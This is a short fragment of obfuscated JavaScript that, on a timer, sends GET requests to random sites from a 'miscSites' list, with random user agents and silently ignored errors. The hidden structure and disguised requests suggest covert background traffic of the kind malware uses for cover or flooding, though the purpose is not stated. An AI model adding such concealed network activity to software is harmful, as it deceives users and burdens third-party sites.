    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x34f + 0x1e24 + 0x83) * getRandomInt(0xd3d + 0x2313 + -0x304f, -0x1cd9 + -0x7d1 + 0x24af));
}, 0x2227 + -0x14d2 + -0xcf1);